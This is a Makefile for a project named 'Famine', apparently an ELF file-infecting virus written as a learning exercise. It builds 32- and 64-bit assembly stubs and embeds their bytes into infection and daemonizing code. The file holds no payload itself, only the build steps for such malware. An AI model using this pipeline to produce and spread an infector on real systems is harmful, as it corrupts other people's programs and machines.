FILES			=	stub.c utils.c elf64_parser.c elf32_parser.c \
					infect.c file_handler.c daemonize.c
SRCDIR			= 	src/

SRCS			= 	${addprefix ${SRCDIR}, ${FILES}} main.c

OBJS			= 	${SRCS:.c=.o}

HEADS			=	ft_famine.h

INC				= 	./include/

DEPS			= 	${addprefix ${INC}, ${HEADS}}

NAME			= 	Famine

CXX				=	clang

CXXFLAGS		= 	-Wall -Wextra -Werror #-g 

INCLUDE 		= 	-I${INC}

SANITIZE 		= 	-fsanitize=address

ASM				= 	-S -masm=intel
ASM32			= 	-S

STUB_ASM64  	= 	${SRCDIR}stub64.asm
STUB_OBJ64  	= 	${SRCDIR}stub64.o
STUB_ELF64  	= 	${SRCDIR}stub64.elf
STUB_BIN64  	= 	${SRCDIR}stub64.bin
STUB_HDR64  	= 	${INC}stub_code64.h

STUB_ASM32  	= 	${SRCDIR}stub32.asm
STUB_OBJ32  	= 	${SRCDIR}stub32.o
STUB_ELF32  	= 	${SRCDIR}stub32.elf
STUB_BIN32  	= 	${SRCDIR}stub32.bin
STUB_HDR32  	= 	${INC}stub_code32.h

%.o: %.c
	${CXX} ${CXXFLAGS} ${INCLUDE} -c $< -o $@

${NAME}: ${STUB_HDR64} ${STUB_HDR32} ${OBJS} ${DEPS}
	${CXX} ${CXXFLAGS} ${SANITIZE} ${OBJS} ${INCLUDE} -o ${NAME}

${STUB_OBJ64}: ${STUB_ASM64}
	nasm -f elf64 ${STUB_ASM64} -o ${STUB_OBJ64}

${STUB_ELF64}: ${STUB_OBJ64}
	ld -o ${STUB_ELF64} ${STUB_OBJ64} \
	   -static -nostdlib -e _start

${STUB_BIN64}: ${STUB_ELF64}
	objcopy -O binary ${STUB_ELF64} ${STUB_BIN64}

${STUB_HDR64}: ${STUB_BIN64}
	@echo "unsigned char stub_code64[] = {" > ${STUB_HDR64}
	@xxd -i < ${STUB_BIN64} >> ${STUB_HDR64}
	@echo "};" >> ${STUB_HDR64}
	@echo "unsigned int stub_code_len64 = sizeof(stub_code64);" >> ${STUB_HDR64}
	@echo "Stub64 assembled and embedded."

${STUB_OBJ32}: ${STUB_ASM32}
	nasm -f elf32 ${STUB_ASM32} -o ${STUB_OBJ32}

${STUB_ELF32}: ${STUB_OBJ32}
	ld -m elf_i386 -o ${STUB_ELF32} ${STUB_OBJ32} \
	   -static -nostdlib -e _start

${STUB_BIN32}: ${STUB_ELF32}
	objcopy -O binary ${STUB_ELF32} ${STUB_BIN32}

${STUB_HDR32}: ${STUB_BIN32}
	@echo "unsigned char stub_code32[] = {" > ${STUB_HDR32}
	@xxd -i < ${STUB_BIN32} >> ${STUB_HDR32}
	@echo "};" >> ${STUB_HDR32}
	@echo "unsigned int stub_code_len32 = sizeof(stub_code32);" >> ${STUB_HDR32}
	@echo "Stub32 assembled and embedded."

${SRCDIR}infect.o: ${STUB_HDR64} ${STUB_HDR32}

all: ${NAME}

asm64: ${STUB_HDR64}
asm32: ${STUB_HDR32}
asm:   ${STUB_HDR64} ${STUB_HDR32}

clean:
	rm -f ${OBJS} \
	      ${STUB_OBJ64} ${STUB_ELF64} ${STUB_BIN64} \
	      ${STUB_OBJ32} ${STUB_ELF32} ${STUB_BIN32}

fclean: clean
	rm -f ${NAME} woody ${STUB_HDR64} ${STUB_HDR32}

re: fclean all

.PHONY: all asm asm32 asm64 clean fclean re